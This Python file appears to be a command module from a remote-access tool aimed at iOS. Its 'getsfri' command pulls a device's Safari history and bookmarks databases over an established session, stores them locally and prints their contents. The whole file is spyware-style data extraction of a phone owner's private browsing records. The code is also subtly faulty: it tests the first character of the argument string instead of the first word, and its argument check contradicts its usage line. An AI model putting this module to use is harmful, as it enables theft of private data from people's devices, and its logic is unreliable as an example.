import os
import modules.helper as h
import modules.dataformat as dformat
import modules.dbfileparser as dbfparser

class command:
    def __init__(self):
        self.name = "getsfri"
        self.description = "show extracted Safari data"
        self.usage = "Usage: getsfri <history/bookmarks>"
        self.category = "data_extraction"

    def run(self, session, cmd_data):
        if len(cmd_data['args'].split(" ")) < 2:
            print(self.usage)
            return
        
        if cmd_data["args"][0] == "history":
            file_name = "history.db"
            h.info_general("Downloading {0}".format(file_name))
            data = session.download_file('/private/var/mobile/Library/Safari/'+file_name)
            if data:
                f = open(os.path.join('downloads', file_name), 'wb')
                f.write(data)
                f.close()
            history_db_file = os.path.join('downloads', file_name)
            hst = dbfparser.parse_safari_history_db(history_db_file)
            dformat.print_formatted_history(hst)
        elif cmd_data["args"][0] == "bookmarks":
            file_name = "Bookmarks.db"
            h.info_general("Downloading {0}".format(file_name))
            data = session.download_file('/private/var/mobile/Library/Safari/'+file_name)
            if data:
                f = open(os.path.join('downloads', file_name), 'wb')
                f.write(data)
                f.close()
            bookmarks_db_file = os.path.join('downloads', file_name)
            bok = dbfparser.parse_safari_bookmarks_db(bookmarks_db_file)
            dformat.print_formatted_bookmarks(bok)